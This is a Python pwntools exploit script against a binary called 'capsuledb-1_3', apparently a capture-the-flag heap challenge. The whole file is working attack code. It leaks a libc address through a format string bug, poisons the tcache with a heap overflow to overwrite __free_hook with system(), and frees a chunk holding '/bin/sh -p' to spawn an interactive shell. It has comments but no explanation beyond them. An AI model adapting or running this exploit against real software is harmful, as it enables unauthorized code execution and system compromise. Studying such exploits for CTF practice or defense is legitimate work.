from pwn import *

elf = context.binary = ELF("./capsuledb-1_3", checksec=False)

proc = process()
#proc = remote("127.0.0.1", 6666)

#gdb.attach(proc,"""continue
#""")

indexcount = 0
def malloc(size,data):
    #sleep(0.1)
    #proc.recvuntil(b"> ")
    proc.sendline(b"1")
    sleep(0.1)
    #proc.recvuntil(b"]: ")
    proc.sendline(b"2")
    sleep(0.1)
    #proc.recvuntil(b"Size: ")
    proc.sendline(f"{size}".encode())
    sleep(0.1)
    #proc.recvuntil(b"Data:")
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(10)
    global indexcount
    indexcount = indexcount+1
    return indexcount-1

def free(index):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"3")
    sleep(0.1)
    #proc.recvuntil(b"Index?: ")
    proc.sendline(f"{index}".encode())
    sleep(0.1)

def edit(index,data):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Index: ")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    #proc.recvuntil(b"]: ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Data:")
    sleep(0.1)
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(2)


def view_data(index):
    sleep(0.1)
    proc.sendline(b"4")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    sleep(0.1)
    proc.sendline(b"2")
    proc.recvuntil(b" *********")
    proc.recvline()
    data=proc.recvline().strip(b"\n")
    return data

def overflow():
    libc = context.binary = ELF("./libc.so.6", checksec=False)
    leak_chunk=malloc(20,b"A")
    edit(leak_chunk,b"%10$p") # Libc leak using format string vulnerability, offset 10 leaks a libc address
    libc_leak = view_data(leak_chunk)

    libc_base = int(libc_leak,16) - 0x3ab2a0 # Libc base address from leak
    libc.address = libc_base

    print(hex(libc_base)) # Libc base

    one_gadget = libc_base + 0x41596 # One_gadget
    fake_chunk = malloc(20,b"/bin/sh -p\x00") # Create a chunk that holds string "/bin/sh", later to be used in system() function

    chunk1=malloc(20,b"A") # Create Chunk1
    chunk2=malloc(20,b"A") # Create Chunk2
    free(chunk2) # Free Chunk2
    edit(chunk1, b"A"*24+p64(0x21)+p64(libc.sym.__free_hook)) # Edit chunk1 to Overwrite userdata of freed Chunk2 using the Overflow bug

    system = libc_base + 0x41710 #- 0x2b2f0
    puts = libc_base + 0x6dba0
    printf = libc_base + 0x54990

    chunk3=malloc(20,b"A") # Un-free Chunk2, free_hook goes to TCACHEbin
    chunk4=malloc(20,p64(system)) # Use free_hook address to write system()'s address using Arbitrary write

    #view_data(fake_chunk)
    free(fake_chunk) # free(*fake_chunk = /bin/sh) -> system(*fake_chunk = /bin/sh)

overflow()




sleep(0.1)
proc.recvuntil(b"6/16\n")
proc.interactive()
